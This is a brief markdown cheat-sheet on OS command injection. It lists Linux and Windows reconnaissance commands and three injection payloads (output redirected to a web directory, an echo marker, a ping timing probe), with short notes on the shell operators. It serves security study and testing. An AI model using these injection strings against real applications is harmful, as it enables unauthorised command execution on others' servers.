---
icon: rectangle-terminal
---

# OS Command Injection

<table><thead><tr><th width="193">Purpose of command</th><th>Linux</th><th>Windows</th></tr></thead><tbody><tr><td>Name of current user</td><td><code>whoami</code></td><td><code>whoami</code></td></tr><tr><td>Operating system</td><td><code>uname -a</code></td><td><code>ver</code></td></tr><tr><td>Network configuration</td><td><code>ifconfig</code></td><td><code>ipconfig /all</code></td></tr><tr><td>Network connections</td><td><code>netstat -an</code></td><td><code>netstat -an</code></td></tr><tr><td>Running processes</td><td><code>ps -ef</code></td><td><code>tasklist</code></td></tr></tbody></table>

* `||whoami>/var/www/images/output.txt||`
  * `||` operator is used in shell scripting to perform **logical OR**.
  * `>` redirect output to specified file
* `& echo aiwefwlguh &`
  * `&` character is a shell command separator.
  * `echo` command causes the supplied string to be echoed in the output.
* `& ping -c 10 127.0.0.1 &`

